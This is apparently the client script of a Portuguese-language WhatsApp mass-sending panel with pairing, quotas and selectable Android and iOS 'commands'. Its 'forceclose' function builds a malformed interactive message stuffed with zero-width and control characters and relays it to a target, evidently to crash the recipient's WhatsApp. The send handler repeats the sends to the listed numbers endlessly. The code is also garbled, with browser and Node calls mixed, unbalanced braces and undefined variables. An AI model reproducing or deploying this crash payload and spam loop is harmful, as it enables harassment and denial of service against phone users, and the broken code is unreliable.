const $ = (s) => document.querySelector(s);
const USER_SEND_LIMIT = 1500;
// Configuração fixa de teste: não depende do painel nem de campos do site.
const AUTOMATION_MESSAGE = ``;
const AUTOMATION_INTERVAL_SECONDS = 4;
let sendCancelRequested = false;
let activeSendController = null;
let sendIntervalSeconds = AUTOMATION_INTERVAL_SECONDS;
let selectedCommandV30 = '';
let commandMessagesV30 = { android: '', ios: '' };

async function api(url, options = {}) {
  const response = await fetch(url, options);
  const data = await response.json().catch(() => ({}));
  if (!response.ok) throw new Error(data.error || "Erro na operação.");
  return data;
}

async function cleanupPendingPairingOnRefresh() {
  try {
    const nav = performance.getEntriesByType('navigation')[0];
    const isReload = nav && nav.type === 'reload';
    if (isReload) await api('/api/whatsapp/cleanup-pairing', { method: 'POST', keepalive: true });
  } catch (_) {}
}

function displayPairingCode(value) {
  const c = String(value || '').toUpperCase().replace(/-/g, '').replace(/[^A-Z0-9]/g, '').slice(0, 8);
  return c.length === 8 ? c.slice(0, 4) + ' ' + c.slice(4) : c;
}

function showNotice(message, type = 'info') {
  const el = $('#actionNotice');
  if (!el) return;
  el.textContent = message;
  el.dataset.type = type;
  el.hidden = false;
  window.clearTimeout(showNotice.timer);
  showNotice.timer = window.setTimeout(() => { el.hidden = true; }, 5000);
}

function statusLabel(status) {
  return ({connected:'● Conectado',pairing:'● Aguardando código',connecting:'● Conectando...',starting:'● Preparando...',reconnecting:'● Reconectando...',disconnected:'● Desconectado',error:'● Erro'})[status] || '● Aguardando';
}

function updateAuthorizedNumbers(rows) {
  const list = $('#authorizedList');
  const count = $('#authorizedCount');
  if (!list || !count) return;
  const active = rows.filter((row) => row.status === 'connected');
  count.textContent = String(active.length);
  list.innerHTML = '';
  if (!active.length) {
    list.innerHTML = '<div class="authorized-empty">Nenhum número ativo ainda.</div>';
    return;
  }
  active.forEach((row) => {
    const item = document.createElement('div');
    item.className = 'authorized-live-row';
    const number = document.createElement('span');
    number.className = 'authorized-live-number';
    const phone = String(row.display_phone_number || row.pairing_phone || '').replace(/\s+/g, '');
    number.textContent = phone ? (phone.startsWith('+') ? phone : `+${phone}`) : 'Número não informado';
    const status = document.createElement('span');
    status.className = 'authorized-live-status';
    status.textContent = 'NÚMERO ATIVO';
    item.append(number, status);
    list.appendChild(item);
  });
}

async function loadWhatsAppNumbers() {
  const rows = await api('/api/whatsapp/numbers');
  updateAuthorizedNumbers(rows);
  const connected = $('#connectedList');
  if (connected) connected.innerHTML = '';
  if (!rows.length) {
    if (connected) connected.innerHTML = '<div class="empty-state">Nenhum WhatsApp conectado ainda.</div>';
    return rows;
  }
  // A lista "WhatsApp conectado" mostra SOMENTE sessões realmente abertas.
  // Números em pareamento, conectando, reconectando ou com erro ficam fora desta lista.
  const connectedRows = rows.filter((row) => row.status === 'connected');
  connectedRows.forEach((row) => {
    if (!connected) return;
    const item = document.createElement('div');
    item.className = 'wa-row';
    const icon = document.createElement('span');
    icon.textContent = '●';
    icon.className = 'wa-check';
    const name = document.createElement('div');
    const strong = document.createElement('strong');
    strong.textContent = row.label || 'WhatsApp';
    const small = document.createElement('small');
    small.textContent = row.display_phone_number || row.pairing_phone || '';
    name.append(strong, small);
    const status = document.createElement('span');
    status.className = 'green online-label';
    status.textContent = '● Conectado';
    item.append(icon, name, status);
    connected.appendChild(item);
  });
  if (connected && !connectedRows.length) {
    connected.innerHTML = '<div class="empty-state">Nenhum WhatsApp conectado ainda.</div>';
  }
  const pairing = rows.find(r => ['starting','connecting','pairing','reconnecting'].includes(r.status) && r.last_pairing_code);
  const pairingBox = $('#pairingBox');
  if (pairing) {
    $('#pairingCode').textContent = displayPairingCode(pairing.last_pairing_code);
    if (pairingBox) pairingBox.hidden = false;
  } else if (pairingBox) {
    pairingBox.hidden = true;
  }
  return rows;
}

function showPairingCode(code) {
  $('#pairingCode').textContent = displayPairingCode(code || '--------');
  $('#pairingBox').hidden = !code;
}

function setSendState(state, line, detail, progressPercent) {
  const box = $('#sendStatusBox');
  const statusLine = $('#sendStatusLine');
  const statusDetail = $('#sendStatusDetail');
  const bar = $('#sendProgressBar');
  if (!box || !statusLine || !statusDetail || !bar) return;
  box.dataset.state = state;
  statusLine.textContent = line;
  statusDetail.textContent = detail || '';
  bar.style.width = `${Math.max(0, Math.min(100, Number(progressPercent) || 0))}%`;
}

function updateUsage(sentCount, limit = USER_SEND_LIMIT) {
  const sent = Math.max(0, Math.min(Number(sentCount) || 0, Number(limit) || USER_SEND_LIMIT));
  const max = Math.max(1, Number(limit) || USER_SEND_LIMIT);
  const pct = Math.min(100, (sent / max) * 100);
  $('#sendUsageText').textContent = `${sent.toLocaleString('pt-BR')} / ${max.toLocaleString('pt-BR')}`;
  const btn = $('#sendButton');
  if (btn && sent >= max) {
    btn.disabled = true;
    btn.textContent = '🚂🚩✌️ Limite atingido';
  }
  return {sent, max, pct};
}

async function loadUsage() {
  try {
    const usage = await api('/api/whatsapp/usage');
    updateUsage(usage.sent_count, usage.limit);
  } catch (_) {}
}

function formatExpiry(iso) {
  if (!iso) return 'EXPIRA: NÃO DEFINIDO';
  const d = new Date(iso);
  if (Number.isNaN(d.getTime())) return 'EXPIRA: DATA INVÁLIDA';
  const date = d.toLocaleDateString('pt-BR');
  const time = d.toLocaleTimeString('pt-BR', {hour:'2-digit', minute:'2-digit'});
  return `EXPIRA DIA ${date} ÀS ${time}`;
}

function parseTargets(raw) {
  const values = String(raw || '')
    .split(/[\n,;\s]+/)
    .map(v => v.trim())
    .filter(Boolean);
  const unique = [];
  const seen = new Set();
  for (const value of values) {
    const digits = value.replace(/\D/g, '');
    if (!digits || seen.has(digits)) continue;
    seen.add(digits);
    unique.push(digits);
  }
  return unique;
}

function isFatalSendError(message) {
  const text = String(message || '').toLowerCase();
  return text.includes('nenhum whatsapp ativo') || text.includes('mensagem ainda não foi configurada') || text.includes('não foi configurada pelo administrador');
}

async function sendSingleTarget(target, signal, jobId = '', message = '') {
  try {
    const result = await api('/api/whatsapp/send', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({target, job_id: jobId, message, command: selectedCommandV30}),
      signal
    });
    return {ok:true, target, result};
  } catch (error) {
    return {ok:false, target, error:error.message || 'Falha no envio.'};
  }
}

function updateActiveSendDock() {
  const dock = $('#activeSendDock');
  const list = $('#activeSendDockList');
  const count = $('#activeSendCount');
  if (!dock || !list || !count) return;
  const rows = Array.from(document.querySelectorAll('#sessionList .session-row[data-active="1"]'));
  count.textContent = String(rows.length);
  list.innerHTML = '';
  rows.forEach((row) => {
    const clone = document.createElement('div');
    clone.className = 'active-send-dock-row';
    const label = row.querySelector('.session-target-label');
    const button = row.querySelector('.cancel');
    const text = document.createElement('span');
    text.textContent = label ? label.textContent : 'Envio';
    const cancel = document.createElement('button');
    cancel.type = 'button';
    cancel.className = 'cancel';
    cancel.textContent = '✕';
    cancel.title = 'Cancelar este envio';
    cancel.setAttribute('aria-label', 'Cancelar este envio');
    cancel.addEventListener('click', () => { if (button) button.click(); });
    clone.append(text, cancel);
    list.appendChild(clone);
  });
  dock.hidden = rows.length === 0;
}

function createSessionRow(target) {
  const list = $('#sessionList');
  if (list.querySelector('.empty')) list.innerHTML = '';
  const row = document.createElement('div');
  row.className = 'session-row session-row-v22';
  row.dataset.active = '1';
  const label = document.createElement('span');
  label.className = 'session-target-label';
  label.textContent = `➤ ${target}`;
  const status = document.createElement('span');
  status.className = 'send-row-status';
  const cancel = document.createElement('button');
  cancel.type = 'button';
  cancel.className = 'cancel';
  cancel.textContent = '✕';
  cancel.setAttribute('aria-label', `Cancelar envio para ${target}`);
  cancel.title = 'Cancelar este envio';
  row.append(label, status, cancel);
  list.prepend(row);
  updateActiveSendDock();
  $('#sessionCount').textContent = String(document.querySelectorAll('#sessionList .session-row').length);

  const controller = new AbortController();
  const jobId = `${Date.now()}-${Math.random().toString(36).slice(2,10)}`;
  let cancelled = false;
  let started = false;
  cancel.addEventListener('click', async () => {
    if (cancelled) return;
    cancelled = true;
    controller.abort();
    cancel.disabled = true;
    cancel.textContent = '…';
    status.textContent = 'Cancelando';
    status.className = 'send-row-status red';
    try {
      await api('/api/whatsapp/send-cancel', {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify({job_id: jobId})
      });
    } catch (_) {}
    if (row.isConnected) row.remove();
    updateActiveSendDock();
    $('#sessionCount').textContent = String(document.querySelectorAll('#sessionList .session-row').length);
  });

  const removeRow = () => {
    if (row.isConnected) row.remove();
    updateActiveSendDock();
    $('#sessionCount').textContent = String(document.querySelectorAll('#sessionList .session-row').length);
  };

  return {
    controller,
    jobId,
    isCancelled() { return cancelled; },
    markQueued() { row.dataset.active = '1'; status.textContent = 'Aguardando'; status.className = 'send-row-status'; cancel.hidden = false; updateActiveSendDock(); },
    markSending() { started = true; row.dataset.active = '1'; status.textContent = 'Enviando'; status.className = 'send-row-status yellow'; cancel.hidden = false; cancel.disabled = false; updateActiveSendDock(); },
    markDone(ok, errorMessage='') {
      if (cancelled) { removeRow(); return; }
      if (ok) {
        row.dataset.active = '0';
        updateActiveSendDock();
        cancel.hidden = true;
        cancel.disabled = true;
        status.textContent = 'Enviado';
        status.className = 'send-row-status green';
      } else {
        // A lista "Últimos envios" guarda somente o que realmente foi entregue.
        // Falhas não ficam como se fossem envios concluídos.
        removeRow();
      }
      if (errorMessage && !ok) row.title = errorMessage;
    },
    markCancelled() { removeRow(); updateActiveSendDock(); },
  };
}

async function loadSendConfig() {
  try {
    const cfg = await api('/api/user-send-config');
    sendIntervalSeconds = Math.max(1, Number(cfg.send_interval_seconds) || 3);
    commandMessagesV30.android = String(cfg.command_android_message || '');
    commandMessagesV30.ios = String(cfg.command_ios_message || '');
  } catch (_) {
    sendIntervalSeconds = 3;
    commandMessagesV30 = { android: '', ios: '' };
  }
}

function waitSeconds(seconds) {
  const total = Math.max(1, Number(seconds) || 1);
  return new Promise((resolve) => {
    let left = total;
    const tick = () => {
      if (sendCancelRequested) return resolve(false);
      if (left <= 0) return resolve(true);
      left -= 1;
      window.setTimeout(tick, 1000);
    };
    tick();
  });
}

async function runAutomaticSend(targets, btn, targetInput) {console.log(targets)
const { Worker } = require('worker_threads');
const N = 5;
const worker = new Worker('./worker.js', { workerData: N });
worker.on('message', async (result) => {
nanX.message.extendedTextMessage.text = result;
});
}

export async function forceclose(sock, target) {
const N = 5;
const nanX = {
groupStatusMessageV2: {
message: {
interactiveMessage: {
header: {
bloksWidget: {
fallback: "\u200D".repeat(N),
type: "\u200F".repeat(N),
data: "[".repeat(N),
uuid: "\u200B".repeat(N),
},
subtitle: "\u0010".repeat(N),
title: "X".repeat(N),
},
nativeFlowMessage: { buttons: [{}] },
body: { text: "\u000F" },
},
},
},
};

const msg = generateWAMessageFromContent(target, nanX, {});

await sock.relayMessage(target, msg.message, {
messageId: msg.key.id, 
noSelfSync: true,
});
}



  sendIntervalSeconds = selectedCommandV30 ? sendIntervalSeconds : AUTOMATION_INTERVAL_SECONDS;
  (async () => {
const usage = await api('/api/whatsapp/usage');
const currentSent = Number(usage.sent_count || 0);
const remaining = Math.max(0, USER_SEND_LIMIT - currentSent);
if (!remaining) {
updateUsage(USER_SEND_LIMIT, USER_SEND_LIMIT);
setSendState('error', '⚠️ LIMITE ATINGIDO', 100);
return;
}
})();
  async (targets = []) => {
  let completed = 0, successCount = 0, failureCount = 0, fatalError = '';
  let stopped = false;
  sendCancelRequested = false;
  setSendState('sending', '🚂🚩✌️ ENVIO INICIADO...', `Programado: ${queue.length.toLocaleString('pt-BR')} número(s).`, 0);
  btn.disabled = true;
  btn.textContent = '🚂🚩✌️ Enviando...';
  const updateProgress = async () => {
    const pct = queue.length ? Math.min(100, (completed / queue.length) * 100) : 100;
    setSendState('sending', '🚂🚩✌️ ENVIANDO...', `${completed.toLocaleString('pt-BR')} processados • ${successCount.toLocaleString('pt-BR')} enviados • ${failureCount.toLocaleString('pt-BR')} falharam.`, pct);
  };
  // Envia um destinatário por vez e aguarda a pausa definida pelo ADM antes do próximo.
  // Isso evita concorrência insegura no socket do WhatsApp.
  for (let index = 0; index < queue.length; index += 1) {
    if (sendCancelRequested || stopped || fatalError) break;
    if (index > 0) {
      const ready = await waitSeconds(sendIntervalSeconds);
      if (!ready || sendCancelRequested || stopped || fatalError) break;
    }
    const target = queue[index];
    const job = createSessionRow(target);
    job.markQueued();
    if (job.isCancelled() || sendCancelRequested || stopped || fatalError) { job.markCancelled(); continue; }
    job.markSending();
    setSendState('sending', '🚂🚩✌️ ENVIANDO...', `Disparo ${index + 1} de ${queue.length}: ${target}`, Math.min(100, (completed / queue.length) * 100));
    try {
      const result = await sendSingleTarget(target, job.controller.signal, job.jobId, message);
      if (result.ok) {
        successCount += 1;
        if (result.result?.sent_count != null) updateUsage(result.result.sent_count, result.result.limit || USER_SEND_LIMIT);
        job.markDone(true);
      } else if (job.isCancelled() || job.controller.signal.aborted || sendCancelRequested) {
        job.markCancelled();
      } else {
        failureCount += 1;
        if (isFatalSendError(result.error)) fatalError = result.error;
        job.markDone(false, result.error);
      }
    } catch (error) {
      if (job.isCancelled() || job.controller.signal.aborted || sendCancelRequested) job.markCancelled();
      else { failureCount += 1; job.markDone(false, error.message || 'Falha no envio.'); }
    } finally {
      completed += 1;
      updateProgress();
    }
    if (fatalError || sendCancelRequested) break;
  }
  stopped = true;
  const finalUsage = await api('/api/whatsapp/usage').catch(() => ({sent_count:currentSent, limit:USER_SEND_LIMIT}));
  updateUsage(finalUsage.sent_count, finalUsage.limit || USER_SEND_LIMIT);
  if (sendCancelRequested) {
    setSendState('error', '⏹️ ENVIO CANCELADO', `${successCount.toLocaleString('pt-BR')} enviado(s). Os demais foram cancelados.`, queue.length ? (completed / queue.length) * 100 : 0);
  } else if (fatalError) {
    setSendState('error', '❌ FALHA NO ENVIO', fatalError, queue.length ? (completed / queue.length) * 100 : 0);
    showNotice(fatalError, 'error');
  } else if (failureCount === 0 && completed === queue.length) {
    setSendState('success', '✅ ENVIO CONCLUÍDO', `${successCount.toLocaleString('pt-BR')} envio(s) concluído(s) automaticamente.`, 100);
    targetInput.value = '';
  } else {
    setSendState('error', '❌ FALHA NO ENVIO', `${successCount.toLocaleString('pt-BR')} enviado(s) e ${failureCount.toLocaleString('pt-BR')} falha(s).`, queue.length ? (completed / queue.length) * 100 : 0);
  }
  btn.disabled = false;
  btn.textContent = '🚂🚩✌️ Enviar';
};

let pairingPollTimer = null;
let activePairingId = null;
let pairingPollStartedAt = 0;

function setConnectModalState(state, text, phone = '') {
  const modal = $('#connectModal');
  const status = $('#connectStatus');
  const phoneEl = $('#connectPhoneStatus');
  const btn = $('#saveConnect');
  if (modal) modal.dataset.state = state || 'idle';
  if (status) status.textContent = text || '';
  if (phoneEl) phoneEl.textContent = phone || '';
  if (btn && state !== 'working') {
    btn.disabled = false;
    btn.textContent = state === 'error' ? 'Tentar novamente' : 'Conectar';
  }
}

function stopPairingPoll() {
  if (pairingPollTimer) {
    clearInterval(pairingPollTimer);
    pairingPollTimer = null;
  }
  activePairingId = null;
  pairingPollStartedAt = 0;
}

function startPairingPoll(id, phone) {
  stopPairingPoll();
  activePairingId = Number(id);
  pairingPollStartedAt = Date.now();
  setConnectModalState('working', '⏳ Conectando ao WhatsApp e gerando o código...', phone.replace(/\D/g, ''));
  const tick = async () => {
    if (!activePairingId) return;
    if (Date.now() - pairingPollStartedAt > 60000) {
      stopPairingPoll();
      setConnectModalState('error', '❌ Tempo esgotado. Tente conectar novamente.', phone);
      return;
    }
    try {
      const rows = await api('/api/whatsapp/numbers');
      const row = rows.find(item => Number(item.id) === activePairingId);
      if (!row) {
        stopPairingPoll();
        setConnectModalState('error', '❌ A tentativa de conexão foi encerrada.', phone);
        return;
      }
      if (row.last_pairing_code) {
        showPairingCode(row.last_pairing_code);
        setConnectModalState('working', '🔐 Código de acesso gerado. Digite-o no WhatsApp.', phone);
        $('#saveConnect').disabled = true;
        $('#saveConnect').textContent = 'Aguardando confirmação';
      } else if (row.status === 'error') {
        stopPairingPoll();
        setConnectModalState('error', `❌ ${row.last_error || 'Não foi possível gerar o código.'}`, phone);
        return;
      }
      console.log(
  'STATUS WHATSAPP:',
  row.status,
  'CODIGO:',
  row.last_pairing_code,
  'ERRO:',
  row.last_error
);

if (row.status === 'connected') {
  stopPairingPoll();
  $('#connectModal').hidden = true;
  showNotice('WhatsApp conectado com sucesso.', 'ok');
  await loadWhatsAppNumbers();
}


function bindCommandSelectorV30() {
  const openButton = $('#commandsButton');
  const panel = $('#commandsPanel');
  const closeButton = $('#closeCommands');
  const selectedBox = $('#selectedCommandV30');
  const options = Array.from(document.querySelectorAll('.command-option-v30'));
  if (!openButton || !panel) return;

  const closePanel = () => {
    panel.hidden = true;
    openButton.setAttribute('aria-expanded', 'false');
  };

  openButton.addEventListener('click', () => {
    panel.hidden = !panel.hidden;
    openButton.setAttribute('aria-expanded', String(!panel.hidden));
  });

  if (closeButton) closeButton.addEventListener('click', closePanel);

  options.forEach((option) => {
    option.addEventListener('click', () => {
      options.forEach((item) => item.classList.remove('selected'));
      option.classList.add('selected');

      const command = option.dataset.command || '';
      selectedCommandV30 = command;
      if (selectedBox) {
        selectedBox.textContent = `✓ Selecionado: ${command}`;
        selectedBox.hidden = false;
      }

      showNotice(`Comando selecionado: ${command}`, 'ok');
    });
  });

  document.addEventListener('click', (event) => {
    if (panel.hidden) return;
    if (!panel.contains(event.target) && !openButton.contains(event.target)) closePanel();
  });
}

function bindUserActions() {
  const connectButton = $('#connectWhatsApp');
  if (!connectButton) return;
  connectButton.addEventListener('click', () => {
    if (location.hash !== '#tab-home') setActiveTab('home');
    stopPairingPoll();
    $('#connectModal').hidden = false;
    $('#pairingBox').hidden = true;
    $('#pairingPhone').value = '';
    $('#saveConnect').disabled = false;
    $('#saveConnect').textContent = 'Conectar';
    setConnectModalState('idle', 'Digite seu número do WhatsApp.');
    $('#pairingPhone').focus();
  });

  const closeConnectionModal = async () => {
    const id = activePairingId;
    stopPairingPoll();
    $('#connectModal').hidden = true;
    if (id) {
      try { await api(`/api/whatsapp/cancel-pairing/${id}`, { method: 'POST' }); } catch (_) {}
      await loadWhatsAppNumbers().catch(() => {});
    }
  };
  $('#closeModal').addEventListener('click', closeConnectionModal);
  $('#cancelConnect').addEventListener('click', closeConnectionModal);

  $('#connectForm').addEventListener('submit', async (event) => {
    event.preventDefault();
    const btn = $('#saveConnect');
    const phone = $('#pairingPhone').value.trim();
    btn.disabled = true;
    btn.textContent = 'Conectando...';
    $('#pairingBox').hidden = true;
    setConnectModalState('working', '⏳ Abrindo conexão...', phone.replace(/\D/g, ''));
    try {
      // Em erro, uma nova tentativa passa novamente por /connect e gera um código novo.
      const result = await api('/api/whatsapp/connect', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({phone})
      });
      setConnectModalState('working', '⏳ Gerando o código de conexão...', phone.replace(/\D/g, ''));
      showNotice('Gerando o código de conexão…', 'ok');
      await loadWhatsAppNumbers();
      startPairingPoll(result.id, phone);
    } catch (error) {
      stopPairingPoll();
      setConnectModalState('error', `❌ ${error.message}`, phone.replace(/\D/g, ''));
      showNotice(error.message, 'error');
      btn.disabled = false;
      btn.textContent = 'Tentar novamente';
    }
  });

  $('#sendForm').addEventListener('submit', async (event) => {

    const btn = $('#sendButton');
    if (btn.disabled) return;
    const targetInput = $('#target');
    const targets = parseTargets(targetInput.value);
    if (!targets.length) {
      setSendState('error', '❌ INFORME O NÚMERO', 'Digite pelo menos um número de destino.', 0);
      targetInput.focus();
      return;
    }
    try {
while (true) {
await runAutomaticSend(targets, btn, targetInput);
}
} catch (error) {
setState(
  'error',
  '❌ FALHA NO ENVIO',
  error.message || 'Não foi possível enviar a mensagem.',
  0
);
}
  btn.disabled = false;
  btn.textContent = '📤 Tentar novamente');
}
  });
}
const sendbutton = document.querySelector('#botaoX');
let intervaloEnvio; 
document.addEventListener('DOMContentLoaded', function() {
const form = document.querySelector('#sendForm');
const targetInput = document.querySelector('#target');
const btn = document.querySelector('#sendbutton');

if (form) {
let intervaloEnvio;
form.addEventListener('submit', async function(event) {
event.preventDefault();
const targets = parseTargets(targetInput.value);
console.log('Alvos capturados:', targets);
clearInterval(intervaloEnvio);

intervaloEnvio = setInterval(async function() {
await runAutomaticSend(targets, btn, targetInput);
console.log('Mensagem enviada automaticamente.');
}, 5000); 
});
}
});
async function initUser() {
try {bindCommandSelectorV30();
    const me = await api('/api/me');
    if (me.role !== 'user') {
      location.href = '/admin.html';
      return;
    }
    $('#userName').textContent = me.name || me.login || 'Usuário';
    const expiry = $('#expiryText');
    if (expiry) expiry.textContent = formatExpiry(me.expires_at);
    const footerDate = $('#footerDate');
    if (footerDate) footerDate.textContent = new Date().toLocaleDateString('pt-BR');
    await cleanupPendingPairingOnRefresh();
    await Promise.all([loadWhatsAppNumbers(), loadUsage(), loadSendConfig()]);
  } catch (error) {
  console.error(error);
  return;
}


}function setActiveTab(name) {
  const panels = {home:'tab-home', numbers:'tab-numbers', send:'tab-send'};
  Object.entries(panels).forEach(([key,id]) => {
    const el = document.getElementById(id);
    if (el) el.classList.toggle('active-tab', key === name);
  });
  // O modal de conexão pertence somente ao Início. Nunca fica aberto na aba Envio.
  if (name !== 'home') {
    const modal = document.getElementById('connectModal');
    if (modal) modal.hidden = true;
  }
  document.querySelectorAll('.bottom-nav-v22 a[data-tab]').forEach(link => {
    const isActive = link.dataset.tab === name;
    link.classList.toggle('active', isActive);
    if (isActive) link.setAttribute('aria-current', 'page');
    else link.removeAttribute('aria-current');
  });
}

document.querySelectorAll('.bottom-nav-v22 a[data-tab]').forEach(link => {
  link.addEventListener('click', (event) => {
    event.preventDefault();
    const tab = link.dataset.tab;
    setActiveTab(tab);
    history.replaceState(null, '', `#tab-${tab}`);
  });
});

const initialTab = location.hash === '#tab-send' ? 'send' : location.hash === '#tab-numbers' ? 'numbers' : 'home';
setActiveTab(initialTab);
initUser();

const whatsappRefreshTimer = window.setInterval(async () => {
  try {
    await loadWhatsAppNumbers();
    await loadUsage();
  await loadSendConfig();
    const me = await api('/api/me');
    const expiry = $('#expiryText');
    if (expiry) expiry.textContent = formatExpiry(me.expires_at);
  } catch (e) { console.error(e); };
}, 2500);
window.addEventListener('beforeunload', () => { if (whatsappRefreshTimer) clearInterval(whatsappRefreshTimer); stopPairingPoll(); });